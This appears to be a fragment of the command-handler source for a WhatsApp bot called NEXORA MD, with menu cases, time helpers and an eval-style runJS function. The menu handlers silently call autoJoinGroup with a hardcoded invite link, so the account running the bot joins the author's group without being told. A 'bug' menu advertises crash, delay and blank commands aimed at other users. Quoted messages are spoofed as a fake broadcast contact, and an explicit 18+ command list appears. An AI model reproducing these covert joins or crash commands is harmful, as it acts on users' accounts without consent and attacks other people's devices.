    if (days > 0) time += `${days}d `;
    if (hours > 0) time += `${hours}h `;
    if (minutes > 0) time += `${minutes}m `;
    if (seconds > 0 || time === '') time += `${seconds}s`;

    return time.trim();
}

// Format RAM usage
function formatRam(total, free) {
    const used = (total - free) / (1024 * 1024 * 1024);
    const totalGb = total / (1024 * 1024 * 1024);
    const percent = ((used / totalGb) * 100).toFixed(1);
    return `${used.toFixed(1)}GB / ${totalGb.toFixed(1)}GB (${percent}%)`;
}

// Count total commands
function countCommands() {
    return 158; // Replace with actual command count
}

// Get mood emoji based on time
function getMoodEmoji() {
    const hour = getLagosTime().getHours();
    if (hour < 12) return '🌅';
    if (hour < 18) return '☀️';
    return '🌙';
}

// Get countdown to next day
function getCountdown() {
    const now = getLagosTime();
    const tomorrow = new Date(now);
    tomorrow.setDate(tomorrow.getDate() + 1);
    tomorrow.setHours(0, 0, 0, 0);
    
    const diff = tomorrow - now;
    const hours = Math.floor(diff / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    
    return `(${hours}h ${minutes}m)`;
}

async function runJS(code) {
  let output = [];
  
  const fakeConsole = {
    log: (...args) => output.push(args.map(String).join(' ')),
    error: (...args) => output.push('[ERROR] ' + args.map(String).join(' '))
  };

  try {
    const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

    const fn = new AsyncFunction(
      'console',
      `"use strict";
      ${code}
      `
    );

    const result = await fn(fakeConsole);

    if (result !== undefined) {
      output.push(String(result));
    }

    return output.length ? output.join('\n') : '✅ Code executed (no output)';
  } catch (err) {
    return `❌ JS Error:\n${err.message}`;
  }
}
// Get current time in Africa/Lagos timezone
try {
  menuAudio = fs.readFileSync('./media/menu.mp3')
} catch {
  console.log(chalk.yellow('⚠️ menu.mp3 not found'))
}
function getLagosTime() {
    try {
        // Try using Intl API for proper timezone handling
        const options = {
            timeZone: 'Africa/Lagos',
            hour12: false,
            hour: 'numeric',
            minute: 'numeric'
        };
        
        const formatter = new Intl.DateTimeFormat('en-GB', options);
        const parts = formatter.formatToParts(new Date());
        
        const hour = parts.find(part => part.type === 'hour').value;
        const minute = parts.find(part => part.type === 'minute').value;
        
        // Create a new Date object with the correct time
        const now = new Date();
        const lagosDate = new Date(now.toLocaleString('en-US', {timeZone: 'Africa/Lagos'}));
        
        return lagosDate;
    } catch (error) {
        // Fallback for environments without Intl API support
        const now = new Date();
        const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
        // Africa/Lagos is UTC+1
        return new Date(utc + (3600000 * 1));
    }
}
function runtimeBarShort(seconds) {
    const barLength = 5;
    const full = 24 * 60 * 60;

    const uptime = Math.max(0, Number(seconds) || 0);
    const percent = Math.min((uptime / full) * 100, 100);

    const filled = Math.floor((percent / 100) * barLength);
    const empty = barLength - filled;

return `▣`.repeat(filled) + `□`.repeat(empty) + ` ${percent.toFixed(0)}%`;
}
let runtime = runtimeBarShort(process.uptime());
// count case
penis = fs.readFileSync("./case.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n⭔ '); 

async function autoJoinGroup(empire, inviteLink) {
  try {
    // Extract invite code from link
    const inviteCode = inviteLink.match(/([a-zA-Z0-9_-]{22})/)?.[1];
    
    if (!inviteCode) {
      throw new Error('Invalid invite link');
    }
    
    // Join the group
    const result = await empire.groupAcceptInvite(inviteCode);
    console.log('✅ Joined group:', result);
    return result;
    
  } catch (error) {
    console.error('❌ Failed to join group:', error.message);
    return null;
  }
}

// Format time specifically for Africa/Lagos
/*function formatLagosTime() {
    const lagosTime = getLagosTime();
    const hours = lagosTime.getHours().toString().padStart(2, '0');
    const minutes = lagosTime.getMinutes().toString().padStart(2, '0');
    return `${hours}:${minutes}`;
}
*/
switch(command) {
case 'menu': 
case 'start': {
    const usedMem = process.memoryUsage().heapUsed / 1024 / 1024;
    const totalMem = os.totalmem() / 1024 / 1024 / 1024;
    const memPercent = (usedMem / (totalMem * 1024)) * 100;
    const ramBar = '▣'.repeat(Math.floor(memPercent / 20)) + '▢'.repeat(5 - Math.floor(memPercent / 20));
    
    const uptimeSec = process.uptime();
    const days = Math.floor(uptimeSec / (3600 * 24));
    const hours = Math.floor((uptimeSec % (3600 * 24)) / 3600);
    const minutes = Math.floor((uptimeSec % 3600) / 60);
    const seconds = Math.floor(uptimeSec % 60);
    const uptime = `${days}d ${hours}h ${minutes}m ${seconds}s`;

    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";
        if (!db.simulator) db.simulator = {};
    if (!db.simulator[m.sender]) {
        db.simulator[m.sender] = { cash: 100, job: "Freelance Hustler 🛠️", inventory: [] };
        saveDB();
    }
    const currentCash = db.simulator[m.sender].cash || 0;

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
await autoJoinGroup(empire, "https://chat.whatsapp.com/H5vrVk7mYgFLTgXDAnCsPq");
    await empire.sendMessage(m.chat, { react: { text: '📋', key: m.key } });
    
    // --- LOCAL IMAGE LOGIC ---
    const bannerPath = getRandomImage('./media/banners/');
    const bannerBuffer = bannerPath ? fs.readFileSync(bannerPath) : fs.readFileSync(`./media/image1.jpg`);

    
    const menuText = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*│*💵 Wallet : *$${currentCash.toLocaleString()}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
*┌────────────────────⬡*
 *│* NEXORA V3 MAIN MENU
 *├───────────────────⬡*
 *│* 1️⃣ ${prefix}*ownermenu* 
 *│* 2️⃣ ${prefix}*Groupmenu* 
 *│* 3️⃣ ${prefix}*Bugmenu* 
 *│* 4️⃣ ${prefix}*xxxmenu* 
 *│* 5️⃣ ${prefix}*Downloadmenu* 
 *│* 6️⃣ ${prefix}*simulatormenu* 
 *│* 7️⃣ ${prefix}*Stickermenu* 
 *│* 8️⃣ ${prefix}*AImenu or Toolsmenu* 
 *│* 9️⃣ ${prefix}*Funmenu* 
 *│* 🔟 ${prefix}*imagemenu* 
 *│* ⚽ ${prefix}*footballmenu* 
 *│* 🌐 ${prefix}*cybermenu* 
 *│* 🎙️ ${prefix}*Voicemenu* 
 *└───────────────────⬡*
> Reply with any number or menu to show it's content 
`;

    const myNumber = '2349118304002'; 
    const myJid = `${myNumber}@s.whatsapp.net`;

    const fakeContact = {
        key: {
            remoteJid: 'status@broadcast', 
            fromMe: false,
            participant: '0@s.whatsapp.net' 
        },
        message: {
            contactMessage: {
                displayName: "Xyron Tech", 
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;Nexora;;;\nFN:MD\nitem1.TEL;waid=${myNumber}:${myNumber}\nitem1.X-ABLabel:Owner\nEND:VCARD`
            }
        }
    };

    await empire.sendMessage(m.chat, {
        image: { url: bannerPath },
        caption: menuText,
        contextInfo: {
            externalAdReply: {
                title: "2026",
                body: "© Xyron 𝚃𝚎𝚌𝚑", 
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: bannerPath,
                sourceUrl: bannerPath,
                renderLargerThumbnail: true, 
                showAdAttribution: true
            },
            forwardingScore: 999,
            isForwarded: false
        }
    }, { quoted: fakeContact });
}
break;

case 'menu2': {
    const usedMem = process.memoryUsage().heapUsed / 1024 / 1024;
    const totalMem = os.totalmem() / 1024 / 1024 / 1024;
    
    const uptimeSec = process.uptime();
    const days = Math.floor(uptimeSec / (3600 * 24));
    const hours = Math.floor((uptimeSec % (3600 * 24)) / 3600);
    const minutes = Math.floor((uptimeSec % 3600) / 60);
    const seconds = Math.floor(uptimeSec % 60);
    const uptime = `${days}d ${hours}h ${minutes}m ${seconds}s`;

    // Fetch accurate local date components natively
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botMode = empire.public ? 'Public' : 'Private';

    if (!db.simulator) db.simulator = {};
    if (!db.simulator[m.sender]) {
        db.simulator[m.sender] = { cash: 100, job: "Freelance Hustler 🛠️", inventory: [] };
        saveDB();
    }
    const currentCash = db.simulator[m.sender].cash || 0;

    await autoJoinGroup(empire, "https://chat.whatsapp.com/H5vrVk7mYgFLTgXDAnCsPq");
    await empire.sendMessage(m.chat, { react: { text: '📋', key: m.key } });
    
    try {
        // Compile the graphic asset buffer with every variable value baked completely into the canvas frame layers!
        const finalFullBuffer = await drawFullMenuImage(
            m.pushName || "User", 
            date, 
            time, 
            day, 
            botMood, 
            botMode, 
            currentCash, 
            prefix
        );

        // Dispatches the final buffer. No caption added, making it crisp, classy, and fully visual.
        await empire.sendMessage(m.chat, { 
            image: finalFullBuffer
        }, { quoted: m });

    } catch (err) {
        console.error("Full Menu Canvas Generation Error: ", err);
        reply("❌ Error compiling custom UI inside canvas image frame layers.");
    }
}
break;

case 'simulatormenu':
case 'ecomenu':
case '6️⃣':  {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // Safety check: Initialize player parameters if data doesn't exist
    if (!db.simulator) db.simulator = {};
    if (!db.simulator[m.sender]) {
        db.simulator[m.sender] = { cash: 100, job: "Freelance Hustler 🛠️", inventory: [] };
        saveDB();
    }
    const currentCash = db.simulator[m.sender].cash || 0;

    // Local Banner Selection Layout
    const simBannerPath = getRandomImage('./media/banners/');
    const simBuffer = simBannerPath ? fs.readFileSync(simBannerPath) : fs.readFileSync(`./media/image1.jpg`);

    const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│* 👤 Owner  : ${m.pushName}   
*│* 📅 Date   : ${date}
*│* ⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│* ✨ *Status* : *Active*        
*│* 🎭 *Mood*   : *${botMood}*
*│* 🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*│* 💵 Wallet : *$${currentCash.toLocaleString()}*
*├──────────────────┤*
*│* 🚀 Link 1 : t.me/nexoramdbot
*│* 🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*

┌─〔🎮  \`ѕιмυℓαтσя мєиυ\` 🎮〕
 *├─⌬* ${prefix}profile
 *├─⌬* ${prefix}shop
 *├─⌬* ${prefix}buy
 *├─⌬* ${prefix}sell
 *├─⌬* ${prefix}work
 *├─⌬* ${prefix}gamble
 *├─⌬* ${prefix}rob
 *├─⌬* ${prefix}pay
 *├─⌬* ${prefix}leaderboard
└────────────────────

`;

const myNumber2 = '2349118304002'; 
    const myJid = `${myNumber2}@s.whatsapp.net`;

    const fakeContact = {
        key: {
            remoteJid: 'status@broadcast', 
            fromMe: false,
            participant: '0@s.whatsapp.net' 
        },
        message: {
            contactMessage: {
                displayName: "Xyron Tech", 
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;Nexora;;;\nFN:MD\nitem1.TEL;waid=${myNumber2}:${myNumber2}\nitem1.X-ABLabel:Owner\nEND:VCARD`
            }
        }
    };

    await empire.sendMessage(m.chat, {
        image: { url: bannerPath },
        caption: text,
        contextInfo: {
            externalAdReply: {
                title: "2026",
                body: "© Xyron 𝚃𝚎𝚌𝚑", 
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: simBannerPath,
                sourceUrl: simBannerPath,
                renderLargerThumbnail: true, 
                showAdAttribution: true
            },
            forwardingScore: 999,
            isForwarded: false
        }
    }, { quoted: fakeContact });
}
break;

case 'ownermenu': 
case '1️⃣': {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";
    
    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // Local Image Logic
    const ownerBannerPath = getRandomImage('./media/banners/');
    const ownerBuffer = ownerBannerPath ? fs.readFileSync(ownerBannerPath) : fs.readFileSync(`./media/image1.jpg`);

    const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
⌬━━━━━━━━━━━━━━━━━━━━━━━⌬
> ⬟ᴛʜᴇᴍᴇ : sᴀᴛᴏʀᴜ x ɪᴛᴀᴄʜɪ

⌬━━━━━━━━━━━━━━━━━━━━━━━⌬
 *┌─*〔 🎉 \`𝙾𝚆𝙽𝙴𝚁 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂\`  🎊〕  
 *├─⌬* ${prefix}*𝗼𝘄𝗻𝗲𝗿*  
 *├─⌬* ${prefix}*SETLASTSEEN*
 *├─⌬* ${prefix}*walkingdead* 
 *├─⌬* ${prefix}*savecontact*
 *├─⌬* ${prefix}*createbiz*
 *├─⌬* ${prefix}*editbiz*
 *├─⌬* ${prefix}*deletebiz*
 *├─⌬* ${prefix}*listbiz*
 *├─⌬* ${prefix}*searchbiz*
 *├─⌬* ${prefix}*bizinfo*
 *├─⌬* ${prefix}*ratebiz*
 *├─⌬* ${prefix}*reviewbiz*
 *├─⌬* ${prefix}*topbiz*
 *├─⌬* ${prefix}*bizbanner*
 *🎨 NEXORA GRAPHICS SYSTEMS*
 *├─⌬* ${prefix}*𝗹𝗹𝗮𝗺𝗮𝗰𝗼𝗱𝗲𝗿*
 *├─⌬* ${prefix}*𝗯𝗹𝘂𝗿*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗵𝗲𝗮𝗿𝘁*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗵𝗼𝗿𝗻𝘆*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗰𝗶𝗿𝗰𝗹𝗲*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗹𝗴𝗯𝘁*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗻𝗮𝗺𝗲𝗰𝗮𝗿𝗱*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝘁𝘄𝗲𝗲𝘁*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝘆𝗼𝘂𝘁𝘂𝗯𝗲-𝗰𝗼𝗺𝗺𝗲𝗻𝘁*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗰𝗼𝗺𝗿𝗮𝗱𝗲*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗴𝗮𝘆*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗴𝗹𝗮𝘀𝘀*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗷𝗮𝗶𝗹*
 *├─⌬* ${prefix}*𝗺𝗶𝘀𝗰 𝗽𝗮𝘀𝘀𝗲𝗱*
 *├─⌬* ${prefix}*𝘁𝗿𝗶𝗴𝗴𝗲𝗿𝗲𝗱*
 📡 *SYSTEMS & UTILITY PIPES*
 *├─⌬* ${prefix}*𝗳𝗯*
 *├─⌬* ${prefix}*𝗳𝗮𝗰𝗲𝗯𝗼𝗼𝗸*
 *├─⌬* ${prefix}*𝗿𝗼𝘀𝗲𝗱𝗮𝘆*
 *├─⌬* ${prefix}*𝗷𝗼𝗸𝗲*
 *├─⌬* ${prefix}*𝗹𝗶𝘀𝘁𝗯𝗹𝗼𝗰𝗸*
 *├─⌬* ${prefix}*𝗿𝗲𝗽𝗼*
 *├─⌬* ${prefix}*𝗛𝗮𝗰𝗸*
 *├─⌬* ${prefix}*𝗰𝗿𝗲𝗮𝘁𝗲𝗴𝗰*
 *├─⌬* ${prefix}*𝗳𝗹𝗶𝗿𝘁*
 *├─⌬* ${prefix}*𝗿𝗯𝗴* 
 *├─⌬* ${prefix}*𝗮𝗳𝗸*
 *├─⌬* ${prefix}*𝘀𝗲𝘁𝗯𝗼𝘁𝗻𝗮𝗺𝗲*
 *├─⌬* ${prefix}*𝗴𝗶𝘁𝗵𝘂𝗯*
 *├─⌬* ${prefix}*𝗰𝗵𝗮𝘁𝗯𝗼𝘁 on/off*
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝗯𝗮𝗱𝘄𝗼𝗿𝗱 *
 *├─⌬* ${prefix}*𝗮𝘂𝘁𝗼𝘁𝘆𝗽𝗶𝗻𝗴 𝗼𝗻/𝗼𝗳𝗳*
 *├─⌬* ${prefix}*𝘂𝗽𝘁𝗶𝗺𝗲*  
 *├─⌬* ${prefix}*𝗿𝗲𝗺𝗼𝘃𝗲𝗯𝗴*  
 *├─⌬* ${prefix}*𝗜𝗻𝘀𝗽𝗲𝗰𝘁𝗻𝘂𝗺*   
 *├─⌬* ${prefix}*𝗚𝗰𝘀𝘁𝗮𝘁𝘂𝘀* 
 *├─⌬* ${prefix}*𝗚𝗿𝗼𝘂𝗽𝘀𝘁𝗮𝘁c𝗶𝘀*
 *├─⌬* ${prefix}*𝗰𝗮𝗹𝗲𝗻𝗱𝗮𝗿* 
 *├─⌬* ${prefix}*𝗕𝗶𝗯𝗹𝗲*  
 *├─⌬* ${prefix}*𝗡𝗲𝘄𝘀*
 *├─⌬* ${prefix}*𝗷𝗼𝗶𝗻-𝗴𝗰 (𝗴𝗿𝗼𝘂𝗽 𝗹𝗶𝗻𝗸)*
 *├─⌬* ${prefix}*𝗤𝘂𝗿𝗮𝗻*
 *├─⌬* ${prefix}*𝗯𝗶𝗿𝘁𝗵𝗱𝗮𝘁𝗲*
 *├─⌬* ${prefix}*𝗔𝗻𝘁𝗶𝗱𝗲𝗹𝗲𝘁𝗲 𝗼𝗻/𝗼𝗳𝗳* 
 *├─⌬* ${prefix}*𝗮𝗴𝗲*  
 *├─⌬* ${prefix}*𝗮𝘇𝗮* 
 *├─⌬* ${prefix}*𝗶𝗻𝘀𝘂𝗹𝘁*
 *├─⌬* ${prefix}*𝗮𝘀𝗸𝗮𝗱𝗺𝗶𝗻*
 *├─⌬* ${prefix}*𝘀𝗲𝗿𝘃𝗲𝗿*  
 *├─⌬* ${prefix}*𝘀𝘁𝗲𝗮𝗹*
 *├─⌬* ${prefix}*𝘁𝗮𝗸𝗲* 
 *├─⌬* ${prefix}*𝗱𝗲𝗹𝗲𝘁𝗲*
 *├─⌬* ${prefix}*𝗰𝗵𝗲𝗰𝗸𝗽𝗮𝘀𝘀* 
 *├─⌬* ${prefix}*𝗰𝗵𝗲𝗰𝗸𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱*
 *├─⌬* ${prefix}*𝗺𝗼𝗿𝘀𝗲*
 *├─⌬* ${prefix}*𝗺𝗼𝗿𝘀𝗲𝗰𝗼𝗱𝗲* 
 *├─⌬* ${prefix}*𝗳𝗿𝗼𝗺𝗺𝗼𝗿𝘀𝗲* 
 *├─⌬* ${prefix}*𝗘𝗻𝗰𝗼𝗱𝗲*
 *├─⌬* ${prefix}*𝗗𝗲𝗰𝗼𝗱𝗲*  
 *├─⌬* ${prefix}*𝗽𝗮𝗶𝗿*  
 *├─⌬* ${prefix}*𝗿𝗲𝗰𝗶𝗽𝗲-𝗶𝗻𝗴𝗿𝗲𝗱𝗶𝗲𝗻𝘁*  
 *├─⌬* ${prefix}*𝘁𝗶𝗺𝗲𝗿*  
 *├─⌬* ${prefix}*𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝗹𝗶𝘀𝘁*  
 *├─⌬* ${prefix}*𝗲𝗺𝗼𝗷𝗶𝗺𝗶𝘅*  
 *├─⌬* ${prefix}*𝗯𝗹𝗼𝗰𝗸*  
 *├─⌬* ${prefix}*𝘀𝗽𝗼𝗻𝗴𝗲𝗯𝗼𝗯*  
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝗯𝗶𝗹𝗹𝗶𝗻𝗴 𝗼𝗻/𝗼𝗳𝗳*  
 *├─⌬* ${prefix}*𝘂𝗻𝗯𝗹𝗼𝗰𝗸*  
 *├─⌬* ${prefix}*𝗮𝗹𝗶𝘃𝗲*  
 *├─⌬* ${prefix}*𝗽𝗶𝗻𝗴*  
 *├─⌬* ${prefix}*𝗽𝗶𝗻𝗴2*  
 *├─⌬* ${prefix}*𝘀𝗲𝗹𝗳*  
 *├─⌬* ${prefix}*𝗽𝘂𝗯𝗹𝗶𝗰*  
 *├─⌬* ${prefix}*𝗰𝗿𝗲𝗮𝘁𝗲𝘄𝗲𝗯𝘀𝗶𝘁𝗲*  
 *├─⌬* ${prefix}*𝗿𝗲𝗺𝗶𝗻𝗱*  
 *├─⌬* ${prefix}*𝘃𝗰𝗳*  
└──────────────────────────

`;
const myNumber3 = '2349118304002'; 
    const myJid = `${myNumber3}@s.whatsapp.net`;

    const fakeContact = {
        key: {
            remoteJid: 'status@broadcast', 
            fromMe: false,
            participant: '0@s.whatsapp.net' 
        },
        message: {
            contactMessage: {
                displayName: "Xyron Tech", 
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;Nexora;;;\nFN:MD\nitem1.TEL;waid=${myNumber3}:${myNumber3}\nitem1.X-ABLabel:Owner\nEND:VCARD`
            }
        }
    };

    await empire.sendMessage(m.chat, {
        image: { url: ownerBannerPath },
        caption: text,
        contextInfo: {
            externalAdReply: {
                title: "2026",
                body: "© Xyron 𝚃𝚎𝚌𝚑", 
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: ownerBannerPath,
                sourceUrl: ownerBannerPath,
                renderLargerThumbnail: true, 
                showAdAttribution: true
            },
            forwardingScore: 999,
            isForwarded: false
        }
    }, { quoted: fakeContact });
}
break;

case 'bugmenu': 
case '3️⃣': {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // STRICT LOCAL RANDOMIZER (No fallback)
    const bugBannerPath = getRandomImage('./media/banners/');
    const bugBuffer = fs.readFileSync(bugBannerPath); 

    const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*

┌─〔👿  \`вυg ¢σммαи∂ѕ\` 😈〕
 *├─⌬* ${prefix}delay
 *├─⌬* ${prefix} crash
 *├─⌬* ${prefix} blank
 *├─⌬* ${prefix} nexora-invis
└────────────────────

`;
const myNumber4 = '2349118304002'; 
    const myJid = `${myNumber4}@s.whatsapp.net`;

    const fakeContact = {
        key: {
            remoteJid: 'status@broadcast', 
            fromMe: false,
            participant: '0@s.whatsapp.net' 
        },
        message: {
            contactMessage: {
                displayName: "Xyron Tech", 
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;Nexora;;;\nFN:MD\nitem1.TEL;waid=${myNumber4}:${myNumber4}\nitem1.X-ABLabel:Owner\nEND:VCARD`
            }
        }
    };

    await empire.sendMessage(m.chat, {
        image: { url: bugBannerPath },
        caption: text,
        contextInfo: {
            externalAdReply: {
                title: "2026",
                body: "© Xyron 𝚃𝚎𝚌𝚑", 
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: bugBannerPath,
                sourceUrl: bugBannerPath,
                renderLargerThumbnail: true, 
                showAdAttribution: true
            },
            forwardingScore: 999,
            isForwarded: false
        }
    }, { quoted: fakeContact });
}
break;
case 'xxxmenu':
case '4️⃣':  {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // Local Image Logic (No URLs)
    const xxxBannerPath = getRandomImage('./media/banners/');
    const xxxBuffer = fs.readFileSync(xxxBannerPath);

    const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
╔═══════════════════╗
║ ⬟ᴛʜᴇᴍᴇ : sᴀᴛᴏʀᴜ x ɪᴛᴀᴄʜɪ  
╚═══════════════════╝

┌─〔  \`18+ COMMANDS\` 🔥🥵〕
 *├─⌬* ${prefix}anal 🥵🔞
 *├─⌬* ${prefix}boobs 🥵🔞
 *├─⌬* ${prefix}bdsm 🥵🔞
 *├─⌬* ${prefix}dick 🥵🔞
 *├─⌬* ${prefix}sixtynine 🥵🔞
 *├─⌬* ${prefix}pussy 🥵🔞
 *├─⌬* ${prefix}anhmoe 🥵🔞
 *├─⌬* ${prefix}anhsfw 🥵🔞
 *├─⌬* ${prefix}anhvideonsfw 🥵🔞
 *├─⌬* ${prefix}anhnsfw 🥵🔞
 *├─⌬* ${prefix}ass 🥵🔞
 *├─⌬* ${prefix}black 🥵🔞
 *├─⌬* ${prefix}bottomless 🥵🔞
 *├─⌬* ${prefix}easter 🥵🔞
 *├─⌬* ${prefix}collared 🥵🔞
 *├─⌬* ${prefix}cum 🥵🔞
 *├─⌬* ${prefix}dom 🥵🔞
 *├─⌬* ${prefix}cumsluts 🥵🔞
 *├─⌬* ${prefix}dp 🥵🔞
 *├─⌬* ${prefix}extreme 🥵🔞
 *├─⌬* ${prefix}finger 🥵🔞
 *├─⌬* ${prefix}fuck 🥵🔞
 *├─⌬* ${prefix}black 🥵🔞
 *├─⌬* ${prefix}futa 🥵🔞
 *├─⌬* ${prefix}nsfw-gif 🥵🔞
 *├─⌬* ${prefix}groupxxx 🥵🔞
 *├─⌬* ${prefix}hentai 🥵🔞
 *├─⌬* ${prefix}kiss 🥵🔞
 *├─⌬* ${prefix}lick 🥵🔞
 *├─⌬* ${prefix}phgif 🥵🔞
 *├─⌬* ${prefix}pegged 🥵🔞
 *├─⌬* ${prefix}sfw-fe 🥵🔞
└─────────────────────────⬡

`;

    const myNumber5 = '2349118304002'; 
    const myJid = `${myNumber5}@s.whatsapp.net`;

    const fakeContact = {
        key: {
            remoteJid: 'status@broadcast', 
            fromMe: false,
            participant: '0@s.whatsapp.net' 
        },
        message: {
